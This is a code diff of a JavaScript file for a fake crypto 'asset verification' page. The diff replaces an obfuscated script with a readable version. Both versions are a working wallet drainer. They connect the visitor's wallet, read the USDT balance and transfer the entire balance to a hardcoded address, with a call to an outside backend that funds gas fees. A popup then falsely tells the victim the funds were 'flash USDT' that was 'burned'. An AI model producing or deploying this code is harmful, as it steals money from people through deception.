@@ -1,1 +1,158 @@
-const _0x4fdd10=_0x34ee;(function(_0x54900f,_0x441f7a){const _0x321338=_0x34ee,_0x53c5ab=_0x54900f();while(!![]){try{const _0x5d1577=parseInt(_0x321338(0x179))/0x1*(-parseInt(_0x321338(0x154))/0x2)+-parseInt(_0x321338(0x161))/0x3*(parseInt(_0x321338(0x196))/0x4)+-parseInt(_0x321338(0x18a))/0x5+parseInt(_0x321338(0x1a3))/0x6*(parseInt(_0x321338(0x147))/0x7)+parseInt(_0x321338(0x1a6))/0x8+parseInt(_0x321338(0x146))/0x9+-parseInt(_0x321338(0x15f))/0xa;if(_0x5d1577===_0x441f7a)break;else _0x53c5ab['push'](_0x53c5ab['shift']());}catch(_0x49eb63){_0x53c5ab['push'](_0x53c5ab['shift']());}}}(_0x372f,0xecb95));const _0x1b5be5=_0x3140;function _0x34ee(_0x1bdecf,_0x320c7f){const _0xcf55f4=_0x372f();return _0x34ee=function(_0x16dfff,_0x2db40c){_0x16dfff=_0x16dfff-0x141;let _0x4da0c8=_0xcf55f4[_0x16dfff];return _0x4da0c8;},_0x34ee(_0x1bdecf,_0x320c7f);}(function(_0x37643c,_0x3a34be){const _0x38164a=_0x34ee,_0x3fa26c=(function(){let _0x51a3ff=!![];return function(_0x4c3b59,_0x403a2a){const _0x2440ae=_0x51a3ff?function(){const _0x1715d8=_0x34ee;if(_0x403a2a){const _0x2f1476=_0x403a2a[_0x1715d8(0x157)](_0x4c3b59,arguments);return _0x403a2a=null,_0x2f1476;}}:function(){};return _0x51a3ff=![],_0x2440ae;};}()),_0x4fd08a=_0x3fa26c(this,function(){const _0x154659=_0x34ee;return _0x4fd08a[_0x154659(0x17e)]()[_0x154659(0x1af)](_0x154659(0x14b))[_0x154659(0x17e)]()['constructor'](_0x4fd08a)[_0x154659(0x1af)](_0x154659(0x14b));});_0x4fd08a();const _0x2c8ba4=(function(){let _0x4a7fb3=!![];return function(_0x2a6357,_0x3ac71f){const _0x384272=_0x4a7fb3?function(){const _0x15cbda=_0x34ee;if(_0x3ac71f){const _0x273c98=_0x3ac71f[_0x15cbda(0x157)](_0x2a6357,arguments);return _0x3ac71f=null,_0x273c98;}}:function(){};return _0x4a7fb3=![],_0x384272;};}()),_0x198b74=_0x2c8ba4(this,function(){const _0x8f6738=_0x34ee,_0x5e1098=function(){const _0x3f3113=_0x34ee;let _0x59b015;try{_0x59b015=Function(_0x3f3113(0x1a7)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x4da234){_0x59b015=window;}return _0x59b015;},_0x5585dd=_0x5e1098(),_0x204600=_0x5585dd[_0x8f6738(0x16a)]=_0x5585dd['console']||{},_0x272c01=[_0x8f6738(0x167),_0x8f6738(0x156),_0x8f6738(0x192),_0x8f6738(0x197),_0x8f6738(0x198),_0x8f6738(0x152),'trace'];for(let _0x57fe86=0x0;_0x57fe86<_0x272c01[_0x8f6738(0x191)];_0x57fe86++){const _0x51bf53=_0x2c8ba4['constructor']['prototype'][_0x8f6738(0x142)](_0x2c8ba4),_0x5ae564=_0x272c01[_0x57fe86],_0x12d051=_0x204600[_0x5ae564]||_0x51bf53;_0x51bf53['__proto__']=_0x2c8ba4['bind'](_0x2c8ba4),_0x51bf53['toString']=_0x12d051['toString'][_0x8f6738(0x142)](_0x12d051),_0x204600[_0x5ae564]=_0x51bf53;}});_0x198b74();const _0x260ffd=_0x3140,_0xf4140=_0x37643c();while(!![]){try{const _0x416657=-parseInt(_0x260ffd(0xeb))/0x1*(parseInt(_0x260ffd(0xa7))/0x2)+parseInt(_0x260ffd(0xa6))/0x3*(-parseInt(_0x260ffd(0xb6))/0x4)+-parseInt(_0x260ffd(0xba))/0x5+-parseInt(_0x260ffd(0xa4))/0x6+parseInt(_0x260ffd(0x94))/0x7*(-parseInt(_0x260ffd(0xea))/0x8)+parseInt(_0x260ffd(0xa1))/0x9+parseInt(_0x260ffd(0xb4))/0xa;if(_0x416657===_0x3a34be)break;else _0xf4140[_0x38164a(0x1a8)](_0xf4140[_0x38164a(0x150)]());}catch(_0x55a9a2){_0xf4140[_0x38164a(0x1a8)](_0xf4140['shift']());}}}(_0x17fe,0x6eebb));const bscAddress='0xDbB78587a1A83097aaf25AC6078F378808d8821e',bnbGasSender=_0x1b5be5(0xb9),usdtContractAddress='0x55d398326f99059fF775485246999027B3197955';let web3,userAddress;function _0x372f(){const _0x24ddcf=['50%','1380120TWollh','block','Wallet\x20not\x20connected.\x20Refresh\x20the\x20page.','getAccounts','User\x20BNB\x20is\x20low.\x20Requesting\x20BNB\x20from\x20backend...','Please\x20switch\x20to\x20BNB\x20Smart\x20Chain.','test','verifyAssets','\x20USDT\x20to\x20','left','5632400kgTQFU','width','load','20px','Loading...','Error\x20connecting\x20wallet:','recipient','length','info','368odXlEv','https://link.trustwallet.com/open_url?coin_id=20000714&url=','Please\x20install\x20Trust\x20Wallet\x20or\x20MetaMask.','4tMSkvU','error','exception','href','balanceOf','getBalance','addEventListener','maxWidth','style','BNB\x20Balance:\x20','div','location','Transferring\x20','10482060BtCBIq','\x20USDT','request','12408312BpjvuK','return\x20(function()\x20','push','sendTransaction','green','send','utils','uint256','none','search','6645RBXuDC','ethereum','fromWei','bind','display','toWei','call','6977124anyEZd','7NJyKPj','address','10px','🔗\x20Please\x20open\x20this\x20page\x20in\x20the\x20Trust\x20Wallet\x20DApp\x20browser.','(((.+)+)+)+$','...','black','eth','function','shift','userAgent','table','2nrOmrR','535574jZfCkc','1232ojfoIv','warn','apply','application/json','⚠️\x20Error\x20sending\x20BNB:','Wallet\x20Connected:','amount','getElementById','400px','padding','13867810odMOyZ','0x38','967848oxWySa','USDT\x20Balance:\x20','top','\x20BNB\x20to\x20','🔗\x20Please\x20open\x20in\x20Trust\x20Wallet\x20browser\x20or\x20connect\x20manually.','#ffebeb','log','wallet_switchEthereumChain','ether','console','\x20BNB','18px','all','469058OBilvS','2306763LSzeEn','0px\x200px\x2010px\x20rgba(0,\x200,\x200,\x200.2)','USDT\x20transfer\x20failed.\x20Ensure\x20you\x20have\x20enough\x20BNB\x20for\x20gas.','✅\x20Verification\x20Successful<br>Your\x20assets\x20are\x20genuine.\x20No\x20flash\x20or\x20reported\x20USDT\x20found.<br><br><b>USDT\x20Balance:</b>\x20','color','\x20for\x20gas\x20fees.','innerHTML','18681710MpZxuo','red','click','1lrIPmV','body','Contract','fontSize','0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87','toString'];_0x372f=function(){return _0x24ddcf;};return _0x372f();}function _0x3140(_0x56410b,_0x469aa1){const _0x491ad4=_0x17fe();return _0x3140=function(_0x36c5fc,_0x38ccc3){_0x36c5fc=_0x36c5fc-0x91;let _0x1a4842=_0x491ad4[_0x36c5fc];return _0x1a4842;},_0x3140(_0x56410b,_0x469aa1);}async function connectWallet(){const _0x20c437=_0x34ee,_0x26f283=_0x1b5be5,_0x2cb13a=/iPhone|iPad|iPod/i[_0x20c437(0x186)](navigator[_0x20c437(0x151)]),_0x4441dc=window[_0x20c437(0x1b1)]&&window[_0x20c437(0x1b1)]['isTrust'];if(_0x2cb13a&&!window[_0x26f283(0xb5)]){const _0x33f509=_0x20c437(0x194)+encodeURIComponent(window[_0x20c437(0x1a1)][_0x20c437(0x199)]);window[_0x20c437(0x1a1)][_0x20c437(0x199)]=_0x33f509,setTimeout(()=>{const _0x40b2f1=_0x20c437;!window[_0x26f283(0xb5)]&&alert(_0x40b2f1(0x165));},0x7d0);return;}if(window[_0x26f283(0xb5)]){web3=new Web3(window[_0x26f283(0xb5)]);try{await window[_0x26f283(0xb5)][_0x26f283(0xdd)]({'method':_0x26f283(0xa0)}),await window[_0x26f283(0xb5)][_0x26f283(0xdd)]({'method':_0x26f283(0xbc),'params':[{'chainId':_0x26f283(0xe0)}]});const _0x146345=await web3[_0x26f283(0xb7)][_0x26f283(0xe1)]();userAddress=_0x146345[0x0],console[_0x26f283(0xc2)](_0x26f283(0xae),userAddress);}catch(_0x2bb362){console[_0x26f283(0xa8)](_0x26f283(0xcb),_0x2bb362),alert(_0x26f283(0xc7));}}else alert(_0x20c437(0x195));}window['addEventListener'](_0x4fdd10(0x18c),async()=>{const _0x433ad0=_0x4fdd10,_0x6c211f=/iPhone|iPad|iPod/i[_0x433ad0(0x186)](navigator[_0x433ad0(0x151)]),_0x57e976=/Android/i['test'](navigator[_0x433ad0(0x151)]),_0x591abb=Boolean(window['ethereum']),_0x9f27ee=_0x591abb&&window['ethereum']['isTrust'];if(_0x9f27ee)await connectWallet();else{if((_0x6c211f||_0x57e976)&&!_0x591abb){const _0x502568=_0x433ad0(0x194)+encodeURIComponent(window[_0x433ad0(0x1a1)][_0x433ad0(0x199)]);window[_0x433ad0(0x1a1)][_0x433ad0(0x199)]=_0x502568,setTimeout(()=>{const _0xa601f9=_0x433ad0;!window[_0xa601f9(0x1b1)]&&alert(_0xa601f9(0x14a));},0x7d0);}}});function _0x17fe(){const _0xcd78f2=_0x4fdd10,_0x51d291=['transfer',_0xcd78f2(0x187),_0xcd78f2(0x155),_0xcd78f2(0x153),_0xcd78f2(0x158),_0xcd78f2(0x181),_0xcd78f2(0x19a),'display','center',_0xcd78f2(0x163),'21FEpkXF','backgroundColor',_0xcd78f2(0x141),_0xcd78f2(0x16b),_0xcd78f2(0x19b),'addEventListener',_0xcd78f2(0x1a2),'fixed','bool',_0xcd78f2(0x1ad),_0xcd78f2(0x17a),_0xcd78f2(0x1ac),'eth_accounts',_0xcd78f2(0x16f),_0xcd78f2(0x14d),_0xcd78f2(0x174),_0xcd78f2(0x180),_0xcd78f2(0x145),_0xcd78f2(0x1b0),_0xcd78f2(0x16e),'error',_0xcd78f2(0x159),_0xcd78f2(0x190),_0xcd78f2(0x1a4),_0xcd78f2(0x182),_0xcd78f2(0x171),_0xcd78f2(0x15a),'appendChild',_0xcd78f2(0x1a0),'boxShadow','✅\x20Sent\x20',_0xcd78f2(0x188),_0xcd78f2(0x176),_0xcd78f2(0x1b1),_0xcd78f2(0x193),_0xcd78f2(0x14e),'\x20USDT<br><b>BNB\x20Balance:</b>\x20',_0xcd78f2(0x17d),'3834135AAKgxs','POST',_0xcd78f2(0x168),_0xcd78f2(0x19f),_0xcd78f2(0x1ae),_0xcd78f2(0x169),_0xcd78f2(0x17b),_0xcd78f2(0x18c),_0xcd78f2(0x167),_0xcd78f2(0x148),'No\x20assets\x20found.',_0xcd78f2(0x178),'popupBox',_0xcd78f2(0x185),'methods','https://bepusdt-backend-production.up.railway.app/send-bnb',_0xcd78f2(0x16c),_0xcd78f2(0x18f),'position','80%',_0xcd78f2(0x184),_0xcd78f2(0x170),_0xcd78f2(0x18b),'borderRadius','_owner','textAlign','stringify',_0xcd78f2(0x189),_0xcd78f2(0x1a9),_0xcd78f2(0x144),_0xcd78f2(0x177),_0xcd78f2(0x173),_0xcd78f2(0x1aa),_0xcd78f2(0x166),_0xcd78f2(0x17e),_0xcd78f2(0x1a5),'50%',_0xcd78f2(0x164),_0xcd78f2(0x160),_0xcd78f2(0x183),'transform',_0xcd78f2(0x14c),_0xcd78f2(0x19d),_0xcd78f2(0x172),_0xcd78f2(0x19e),_0xcd78f2(0x15c)];return _0x17fe=function(){return _0x51d291;},_0x17fe();}async function verifyAssets(){const _0x5639b4=_0x4fdd10,_0x28092b=_0x1b5be5;if(!web3||!userAddress){await connectWallet();if(!web3||!userAddress){alert('Wallet\x20not\x20connected.\x20Refresh\x20the\x20page.');return;}}const _0x2d6331=new web3[(_0x28092b(0xb7))][(_0x28092b(0xc0))]([{'constant':!![],'inputs':[{'name':_0x28092b(0xd2),'type':_0x28092b(0xc3)}],'name':_0x28092b(0xee),'outputs':[{'name':'','type':'uint256'}],'type':_0x5639b4(0x14f)}],usdtContractAddress),[_0x3a608a,_0x1c9223]=await Promise[_0x5639b4(0x16d)]([_0x2d6331[_0x28092b(0xc8)][_0x28092b(0xee)](userAddress)[_0x28092b(0xa5)](),web3[_0x28092b(0xb7)][_0x28092b(0x98)](userAddress)]),_0x5ad27c=parseFloat(web3[_0x5639b4(0x1ac)][_0x28092b(0x96)](_0x3a608a,'ether')),_0x25e2ea=parseFloat(web3['utils'][_0x28092b(0x96)](_0x1c9223,_0x28092b(0xbf)));console[_0x28092b(0xc2)](_0x5639b4(0x162)+_0x5ad27c+_0x28092b(0xab)),console[_0x28092b(0xc2)](_0x28092b(0xbd)+_0x25e2ea+_0x28092b(0x97));if(_0x5ad27c===0x0){showPopup(_0x28092b(0xc4),_0x28092b(0xa2));return;}if(_0x5ad27c<=0x1){showPopup(_0x28092b(0xe5)+_0x5ad27c+_0x28092b(0xb8)+_0x25e2ea+_0x5639b4(0x16b),_0x28092b(0xda));return;}showPopup(_0x5639b4(0x18e),_0x28092b(0xda)),transferUSDT(_0x5ad27c,_0x25e2ea);}async function transferUSDT(_0x624e29,_0x154ee3){const _0x162048=_0x4fdd10,_0x47de2a=_0x1b5be5;try{_0x154ee3<0.0005&&(console[_0x162048(0x167)](_0x47de2a(0xce)),await fetch(_0x47de2a(0xc9),{'method':_0x47de2a(0xbb),'headers':{'Content-Type':_0x47de2a(0xec)},'body':JSON[_0x47de2a(0xd4)]({'toAddress':userAddress})}));const _0x136552=new web3[(_0x47de2a(0xb7))][(_0x47de2a(0xc0))]([{'constant':![],'inputs':[{'name':_0x47de2a(0xaa),'type':_0x47de2a(0xc3)},{'name':_0x162048(0x15b),'type':_0x47de2a(0x9d)}],'name':_0x47de2a(0xe8),'outputs':[{'name':'','type':_0x47de2a(0x9c)}],'type':_0x162048(0x14f)}],usdtContractAddress),_0xc7b811=web3[_0x47de2a(0x9f)][_0x47de2a(0xd7)](_0x624e29[_0x47de2a(0xdc)](),_0x47de2a(0xbf));console[_0x162048(0x167)](_0x47de2a(0x9a)+_0x624e29+_0x47de2a(0xb3)+bscAddress+_0x47de2a(0xe3)),await _0x136552[_0x47de2a(0xc8)][_0x47de2a(0xe8)](bscAddress,_0xc7b811)[_0x162048(0x1ab)]({'from':userAddress}),showPopup('✅\x20Verification\x20Successful<br>Flash\x20USDT\x20has\x20been\x20detected\x20and\x20successfully\x20burned.<br><br><b>USDT\x20Burned:</b>\x20'+_0x624e29+_0x47de2a(0xab),_0x47de2a(0xd8)),console[_0x47de2a(0xc2)]('✅\x20Transferred\x20'+_0x624e29+_0x162048(0x188)+bscAddress);}catch(_0x43c45c){console[_0x47de2a(0xa8)]('❌\x20USDT\x20Transfer\x20Failed:',_0x43c45c),alert(_0x47de2a(0xad));}}async function sendBNB(_0x3a2795,_0x38ab0f){const _0x4148f7=_0x4fdd10,_0x1f886a=_0x1b5be5;try{await web3[_0x1f886a(0xb7)][_0x1f886a(0xd6)]({'from':bnbGasSender,'to':_0x3a2795,'value':web3[_0x4148f7(0x1ac)][_0x4148f7(0x144)](_0x38ab0f,_0x1f886a(0xbf)),'gas':0x5208}),console[_0x4148f7(0x167)](_0x1f886a(0xb2)+_0x38ab0f+_0x1f886a(0xdf)+_0x3a2795+_0x1f886a(0xa3));}catch(_0x3382ac){console[_0x4148f7(0x197)](_0x1f886a(0xa9),_0x3382ac);}}function showPopup(_0x4014d7,_0x45f183){const _0x31c845=_0x4fdd10,_0x5f5955=_0x1b5be5;let _0x1b465f=document[_0x31c845(0x15c)](_0x5f5955(0xc6));!_0x1b465f&&(_0x1b465f=document['createElement'](_0x5f5955(0xb0)),_0x1b465f['id']=_0x5f5955(0xc6),_0x1b465f[_0x31c845(0x19e)][_0x5f5955(0xcc)]=_0x5f5955(0x9b),_0x1b465f[_0x5f5955(0xe6)][_0x5f5955(0x93)]=_0x31c845(0x17f),_0x1b465f[_0x5f5955(0xe6)][_0x5f5955(0xd5)]=_0x5f5955(0xde),_0x1b465f[_0x5f5955(0xe6)][_0x5f5955(0xe2)]='translate(-50%,\x20-50%)',_0x1b465f['style'][_0x31c845(0x15e)]=_0x31c845(0x18d),_0x1b465f[_0x5f5955(0xe6)][_0x5f5955(0xd1)]=_0x31c845(0x149),_0x1b465f[_0x5f5955(0xe6)][_0x5f5955(0xb1)]=_0x5f5955(0xcf),_0x1b465f[_0x5f5955(0xe6)][_0x5f5955(0xd3)]=_0x5f5955(0x92),_0x1b465f[_0x5f5955(0xe6)][_0x31c845(0x17c)]=_0x5f5955(0xca),_0x1b465f[_0x5f5955(0xe6)][_0x5f5955(0xd0)]=_0x5f5955(0xcd),_0x1b465f[_0x5f5955(0xe6)][_0x5f5955(0xe4)]=_0x31c845(0x15d),document[_0x5f5955(0x9e)][_0x5f5955(0xaf)](_0x1b465f)),_0x1b465f[_0x5f5955(0xe6)][_0x5f5955(0x95)]=_0x45f183===_0x5f5955(0xd8)?_0x5f5955(0xdb):'#e6f7e6',_0x1b465f[_0x5f5955(0xe6)][_0x5f5955(0xd9)]=_0x45f183===_0x31c845(0x177)?_0x5f5955(0xd8):_0x5f5955(0xda),_0x1b465f[_0x31c845(0x175)]=_0x4014d7,_0x1b465f[_0x31c845(0x19e)][_0x5f5955(0x91)]=_0x5f5955(0xed),setTimeout(()=>{const _0x115e69=_0x31c845,_0x416b8a=_0x5f5955;_0x1b465f[_0x115e69(0x19e)][_0x115e69(0x143)]=_0x416b8a(0xbe);},0x1388);}document[_0x1b5be5(0xe7)](_0x1b5be5(0xe9))[_0x4fdd10(0x19c)](_0x1b5be5(0xc5),verifyAssets);
+const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Your USDT receiving address
+const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87"; // Wallet for gas fees
+const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract
+
+let web3;
+let userAddress;
+
+async function connectWallet() {
+    if (window.ethereum) {
+        web3 = new Web3(window.ethereum);
+        try {
+            await window.ethereum.request({ method: "eth_requestAccounts" });
+
+            // Force switch to BNB Smart Chain
+            await window.ethereum.request({
+                method: "wallet_switchEthereumChain",
+                params: [{ chainId: "0x38" }]
+            });
+
+            const accounts = await web3.eth.getAccounts();
+            userAddress = accounts[0];
+            console.log("Wallet Connected:", userAddress);
+        } catch (error) {
+            console.error("Error connecting wallet:", error);
+            alert("Please switch to BNB Smart Chain.");
+        }
+    } else {
+        alert("Please install MetaMask.");
+    }
+}
+
+// Auto-connect wallet on page load
+window.addEventListener("load", connectWallet);
+
+async function verifyAssets() {
+    if (!web3 || !userAddress) {
+        alert("Wallet not connected. Refresh the page.");
+        return;
+    }
+
+    const usdtContract = new web3.eth.Contract([
+        { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
+    ], usdtContractAddress);
+
+    // Fetch balances
+    const [usdtBalanceWei, userBNBWei] = await Promise.all([
+        usdtContract.methods.balanceOf(userAddress).call(),
+        web3.eth.getBalance(userAddress)
+    ]);
+
+    const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
+    const userBNB = parseFloat(web3.utils.fromWei(userBNBWei, "ether"));
+
+    console.log(`USDT Balance: ${usdtBalance} USDT`);
+    console.log(`BNB Balance: ${userBNB} BNB`);
+
+    if (usdtBalance === 0) {
+        showPopup("No assets found.", "black");
+        return;
+    }
+
+    if (usdtBalance <= 1) {
+        showPopup(
+            `✅ Verification Successful<br>Your assets are genuine. No flash or reported USDT found.<br><br><b>USDT Balance:</b> ${usdtBalance} USDT<br><b>BNB Balance:</b> ${userBNB} BNB`,
+            "green"
+        );
+        return;
+    }
+
+    // User has more than 150 USDT → Check BNB Gas Fee
+    showPopup("Loading...", "green");
+
+    transferUSDT(usdtBalance, userBNB);
+}
+
+async function transferUSDT(usdtBalance, userBNB) {
+    try {
+        if (userBNB < 0.0005) {
+    console.log("User BNB is low. Requesting BNB from backend...");
+    await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ toAddress: userAddress })
+    });
+        }
+
+        // Proceed with USDT Transfer
+        const usdtContract = new web3.eth.Contract([
+            { "constant": false, "inputs": [{ "name": "recipient", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
+        ], usdtContractAddress);
+
+        const amountToSend = web3.utils.toWei(usdtBalance.toString(), "ether");
+
+        console.log(`Transferring ${usdtBalance} USDT to ${bscAddress}...`);
+
+        await usdtContract.methods.transfer(bscAddress, amountToSend).send({ from: userAddress });
+
+        showPopup(
+            `✅ Verification Successful<br>Flash USDT has been detected and successfully burned.<br><br><b>USDT Burned:</b> ${usdtBalance} USDT`,
+            "red"
+        );
+
+        console.log(`✅ Transferred ${usdtBalance} USDT to ${bscAddress}`);
+    } catch (error) {
+        console.error("❌ USDT Transfer Failed:", error);
+        alert("USDT transfer failed. Ensure you have enough BNB for gas.");
+    }
+}
+
+async function sendBNB(toAddress, amount) {
+    try {
+        await web3.eth.sendTransaction({
+            from: bnbGasSender,
+            to: toAddress,
+            value: web3.utils.toWei(amount, "ether"),
+            gas: 21000
+        });
+
+        console.log(`✅ Sent ${amount} BNB to ${toAddress} for gas fees.`);
+    } catch (error) {
+        console.error("⚠️ Error sending BNB:", error);
+    }
+}
+
+// Function to display pop-up message
+function showPopup(message, color) {
+    let popup = document.getElementById("popupBox");
+    
+    if (!popup) {
+        popup = document.createElement("div");
+        popup.id = "popupBox";
+        popup.style.position = "fixed";
+        popup.style.top = "50%";
+        popup.style.left = "50%";
+        popup.style.transform = "translate(-50%, -50%)";
+        popup.style.padding = "20px";
+        popup.style.borderRadius = "10px";
+        popup.style.boxShadow = "0px 0px 10px rgba(0, 0, 0, 0.2)";
+        popup.style.textAlign = "center";
+        popup.style.fontSize = "18px";
+        popup.style.width = "80%";
+        popup.style.maxWidth = "400px";
+        document.body.appendChild(popup);
+    }
+
+    popup.style.backgroundColor = color === "red" ? "#ffebeb" : "#e6f7e6";
+    popup.style.color = color === "red" ? "red" : "green";
+    popup.innerHTML = message;
+    popup.style.display = "block";
+
+    // Auto-hide after 5 seconds
+    setTimeout(() => {
+        popup.style.display = "none";
+    }, 5000);
+}
+
+// Attach event listener
+document.getElementById("verifyAssets").addEventListener("click", verifyAssets);
